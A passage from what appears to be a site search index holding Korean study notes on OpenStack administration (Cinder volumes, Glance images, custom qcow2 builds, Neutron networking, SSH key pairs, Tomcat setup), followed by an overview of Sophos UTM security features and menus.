/home/cinder-volumes\n링크 파일은 안됨 losetup 쓸쑤 있는 장치 확인 vgcreate cinder-volumes /dev/loop0\nopenstack-service list | xargs systemctl restart\nsystemctl restart openstack-cinder-volume openstack-losetup\numount /home\nvi /etc/fstab\n자동 마운트 하는 걸 주석처리 lvremove /dev/centos/home\n삭제처리 lvdisplay\nlvextend -L + 400G /dev/centos/root\nlvdisplay /dev/centos/root\nxfs_growfs /dev/centos/root\ndf -h\nfallocate -l 100G cinder-volumes\nls -lh cinder-volumes\nlosetup\nvgcreate cinder-volumes /dev/loop0\n오픈스택 Cinder(블록 스토리지 서비스)    cinder란? LVM의 특성을 이용해서 논리 볼륨을 생성, 생성된 볼륨을 인스턴스에 할당해 일반적일 하드디스크처럼 사용\n  cinder 명령어 (1) 볼륨 확인 cinder list\n  (2) 자세히 확인\rcinder show [볼륨 이름]\r(3) 볼륨 생성\rcinder create [용량] --name [이름]\r(4) 볼륨 삭제\rcinder delete [볼륨 이름]\r 로그인 풀리는 거\nvi /etc/openstack-dashboard/local_settings Timeout 등의 세팅\nadmin_openrc.sh 사용시 어드민의 권한을 획득\n오픈스택 Glance(이미지 관리 서비스)    Glance 구조 이미지를 저장하면 glance-registry로 Glance DB에 저장\n  가상머신 이미지 형식 aki\t아마존 커널 이미지 ami\t아마존 머신 이미지 ari\t아마존 RAM 디스크 이미지 iso\t광학 디스크나 CD-ROM의 데이터 콘텐츠를 지원하는 아카이브 포맷 qcow2\tQEMU 에뮬레이터가 지원하는 포맷 raw\t구조화되지 않은 디스크 포맷 vdi\tVirtualBox 모니터와 QEMU 에뮬레이터가 지원하는 포맷 vmdk\t일반적인 디스크 포맷으로 여러 가상 머신 노미터가 지원, VMware\n  주의사항 오픈스택 이미지를 생성할 때는 VMware처럼 운영체제 설치 파일(iso)로 가상머신을 생성하는 것이 아니라 이미 운영체제가 이미 설치가 된 가상머신을 이미지로 등록해야 함\n  따라서 이미지는 클라우드 전용이미지를 사용하는 것이 좋다.\rCentOS\thttp://cloud.centos.org/centos/7/images/\rCirrOS\thttp://download.cirros-cloud.net/\r우분투\thttp://cloud-images.ubuntu.com/\r Glance 명령어 (1) 현재 이미지 목록 확인 openstack image list  (1) 특정 이미지의 자세한 정보 확인\ropenstack image show [이미지 이름]\r(3) 이미지 삭제\ropenstack image delete [이미지 이름]\r(4) 이미지 추가\ropenstack image create --public --container-format bare --disk-format qcow2 --file [경로를 포함한 이미지 파일 이름] [이미지 이름]\ropenstack image create --public --container-format bare --disk-format qcow2 --file /T/centos7.qcow2 CentOS7\r 커스텀 이미지 관리 1. xming 윈도우에 설치 자료실에서 다운 및 설치  2. CentOS 준비 후 CentOS에 가상머신 프로그램 설치 및 실행\ryum install qemu kvm qemu-kvm libvirt virt-install bridge-utils virt-manager dejavu-lgc-sans-fonts virt-viewer\r3. 컨트롤러 노드에서 가상머신 환경 설정\rsystemctl restart libvirtd\r4. ISO 파일로 qcow2 이미지 파일 생성\r자료실에 ISO 파일 CentOS로 다운\rqemu-img create -f qcow2 [이미지 파일 위치] [이미지 파일 크기]\rqemu-img create -f qcow2 /test/centos7.qcow2 10G\r5. ISO로 가상머신 생성\r virt-install \u0026ndash;name centos \u0026ndash;ram 1024\n\u0026ndash;disk ./centos7.qcow2,format=qcow2\n\u0026ndash;network network=default\n\u0026ndash;graphics vnc,listen=0.0.0.0 \u0026ndash;noautoconsole\n\u0026ndash;os-type=linux \u0026ndash;os-variant=centos7.0\n\u0026ndash;location=[ISO 위치]\n6. 본체 윈도우에서 putty x11 설정\r푸티 실행 -\u0026gt; SSH -\u0026gt; X11 -\u0026gt; Enable X11 Forwarding 체크 -\u0026gt; X display location : localhost:0 설정 후 접속\rvirt-manager\r7. 생성한 QEMU 가상머신 설정\r1. SELINUX 끄기\r2. acpid 설치 및 설정\r3. cloud-init 및 cloud-utils 설치 및 설정\r4. /etc/sysconfig/network\r5. qemu-guest-agent 설치 및 설정\r6. grub 수정\r8. 생성한 가상머신에서 이미지 작업\r설치하고 싶은거 설치\r  설치 후 설정(CentOS에서) yum install /usr/bin/virt-sysprep virt-sysprep -d centos\t\u0026lt;-네트워크 장치의 MAC주소와 같은 정보를 삭제하는 작업 virsh undefine centos\t\u0026lt;-가상머신 삭제하는 작업(이미지 생성이 끝났으니까)\nhttps://docs.openstack.org/image-guide/centos-image.html\n  nova\nnova.conf\nvirt-install \u0026ndash;name centos \u0026ndash;ram 1024 \u0026ndash;disk /T/centos7.qcow2,format=qcow2 \u0026ndash;network network=default \u0026ndash;graphics vnc,listen=0.0.0.0 \u0026ndash;noautoconsole \u0026ndash;os-type=linux \u0026ndash;os-variant=centos7.0 \u0026ndash;location=/T/C.iso\n오픈스택 네트워크 구조\n  Neutron 프로젝트 오픈스택에서 네트워크 서비스를 생성 및 관리하는 프로젝트\t사용자는 Neutron API를 통해 Neutron Plugin에게 사용자 요청을 전달\n  Neutron Plugin Neutron에서 가장 많이 사용되는 플러그인은 OVS(Open vSwitch)이다. 해당 플러그인은 효율적으로 패킷을 포워딩하기 위한 가상의 네트워크 스위치이다.\n  OVS 구조\n  네트워크 관련 명령어 (1) 네트워크 확인 openstack network list\n  (2) 네트워크 정보 조회\ropenstack network show [네트워크 이름]\r(3) 라우터 정보 조회\rip netns\r(4) 라우터의 자세한 정보 조회\rip netns exec [라우터이름] [리눅스 명령어]\rnetstat -r\rarp -an\rifconfig\rping (5) 네트워크 생성\ropenstack network create --provider-network-type [타입] [네트워크 이름] (6) 서브넷 생성\ropenstack subnet create --network [네트워크 이름] --gateway [GW주소] --subnet-range [서브넷 범위] [서브넷 이름\r(7) 라우터 목록 확인\ropenstack router list\r(8) 라우터 정보 조회\ropenstack router show [라우터 이름]\r(9) 라우터에 서브넷 추가\ropenstack router add subnet [라우터 이름] [서브넷 이름]\r(10) 포트 생성\ropenstack port create --network [네트워크 이름] --fixed-ip subnet=[서브넷 이름] [포트 이름]\r(11) 라우터에 포트 추가\ropenstack router add port [라우터 이름] [포트 이름]\r fixed-ip와 floating-ip Fixed IP\t: 원래는 인터넷에 연결하기 위해 KT, SK, LG와 같은 인터넷 서비스 업체로부터 제공받는 공인 IP를 의미한다. 하지만 클라우드에서는 클라우드 내에서 생성한 가상머신에 할당되는 내부 IP를 의미한다.  Floating IP\t: 클라우드 내의 가상머신이 인터넷 외부망과 연결되기 위해 배정 받는 IP를 의미한다.\r 보안 그룹 인스턴스에 대한 인바운드 및 아웃바운드 트래픽을 제어하는 가상의 네트워크 방화벽  하나의 인스턴스에 여러 개의 보안 그룹 적용도 가능\r  key 페어 등록  key 권한 변경 chmod 700 [ Key파일 ] ssh -i [ key 파일 ] [ CentOS or Ubuntu : 호스트 이름 ]@[ 192.168.0.204 : 해당 대역 ]\n접속확인 ssh [ CentOS or Ubuntu ]@[ 192.168.0.204 : 해당 대역 ]\n형식 바꾸기\nPuttygen 으로 생성\nsave private 키 클릭\n푸티 접속\ncat authorized_keys\nsudo chown -R tomcat9jdk8:tomcat9jdk8 apache-tomcat-9.0.33\nfirewall-cmd \u0026ndash;permanent \u0026ndash;zone=public \u0026ndash;add-port=8080/tcp firewall-cmd \u0026ndash;reload\nwget -p /sw http://apache.mirror.cdnetworks.com/tomcat/tomcat-9/v9.0.22/bin/apache-tomcat-9.0.22.tar.gz\nopenstack image create \u0026ndash;public \u0026ndash;container-format bare \u0026ndash;disk-format qcow2 \u0026ndash;file ./centos7.qcow2 CentOS7\n"});index.add({'id':169,'href':'/docs/network/sophos/','title':"Sophos",'content':"Sophos   Sophos UTM ( United Threat Management )    Sophos UTM이란 Sophos사에서 리눅스 커널을 이용해 만든 UTM장비\n  UTM : Anti Virus, Firewall, IPS ( 침입방지시스템 ) , VPN , IDS ( 침입탐지시스템 )등의 보안기능 중 적어도 2개, 많게는 7~8가지 기능을 하나의 장비에 포함하여 사용하는 통합보안장비\n    통합위협관리시스템( UTM )의 주요 기능     기능 설명     Firewall Stateful Packet Inspection( SPI ) Firewalld, SMTP, HTTP, POP3, DNS, Proxy 기능이 결합된 견고한 network보안 구축   VPN IPsec VPN(DES/3DES) 및 L2TP VPN 지원   IDS/ IPS 다양한 network 기반 공격 탐지 및 차단, 다양한 Application 기반 공격 탐지 및 차단, Anomaly Detection, Dos/DDos,   Anti-Scan Attack Scan Attack 기반 공격 탐지 및 차단   Anti Virus 이메일 기반 내/외부 유입 바이러스 탐지 및 차단, Web 기반 내/외부 유입 바이러스 탐지 및 차단   Anti-Spam 베이시안(Baysian) 알고리즘 기반 스팸메일 탐지 및 차단, 점수(Score) 데이터 기반 스팸 메일 탐지 및 차단   Content Filtering 유해사이트 및 정책 위배 웹사이트 접근 탐지 및 차단   ext Transparent/Router/NAT 모드 지원, 피싱 차단 및 SIP Proxy 기능 제공      Sophos UTM 메뉴의 역할     메뉴 역할     Webserver Protection WAF ( Web Application Firewall ) Web Hacking 방어   Support Tools ping test, traceroute   Network Protection NAT Masquerding PAT   Network Protection Firewall Country Blocking 특정 국가에서 들어오는 트래픽을 차단   Network Protection Firewall ICMP Ping 허용/차단 설정용도 ( ping settings에 \u0026lsquo;Gateway forward pings를 허용해줘야 내부에서 외부로 ping이 전송 )   Network Protection Firewall Advanced Connection tracking helpers FTP Stateful기능 사용여부   Web Protection Client를 외부로부터 보호하는 역할 ( 사용자 보호하는 것으로 웹서버 보호 X )   Web Protection - Web Filtering    Standard Mode Client측 장비한테 UTM장비에게 가라고 지정을 해줘야지만 UTM장비에서 검사 ( default : 외부로 전송 )   Transparent Mode 별도로 UTM장비에게 가라고 지정하지 않아도 UTM장비가 검사      "});})();